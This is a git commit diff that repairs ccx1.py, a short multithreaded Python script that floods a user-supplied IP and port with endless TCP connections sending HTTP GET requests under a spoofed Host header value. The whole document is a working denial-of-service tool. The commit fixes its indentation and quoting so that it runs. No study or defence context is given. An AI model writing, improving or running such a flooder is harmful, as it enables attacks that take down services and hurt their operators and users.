b4af8f66e0826696ab1a167bb5130733d6c849a7
matthewperrino25 <77859420+matthewperrino25@users.noreply.github.com>
2024-04-09 20:36:06 -0400

    Add files via upload

--- ccx1.py
+++ ccx1.py
@@ -2,26 +2,27 @@ import socket
 import threading
 import os
 
-target = str(input("Insert target’s IP: "))
+target = input("Insert target’s IP: ")
 port = int(input("Insert Port: "))
 Trd = int(input("Insert number of Threads: "))
 fake_ip = '44.197.175.168'
 
+attack_num = 0
+
 def attack():
- while True:
- s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- s.connect((target, port))
- s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode(’ascii’), (target, port))
- s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode(’ascii’), (target, port))
- s.close()
- 
- for i in range(Trd):
- thread = threading.Thread(target=attack)
- thread.start()
- 
- global attack_num
- attack_num += 1
- print(attack_num)
- 
- os.system("clear") 
+    global attack_num
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+        attack_num += 1
+        print(attack_num)
+
+for i in range(Trd):
+    thread = threading.Thread(target=attack)
+    thread.start()
+
+os.system("clear") 
 os.system("toilet ToolName") 
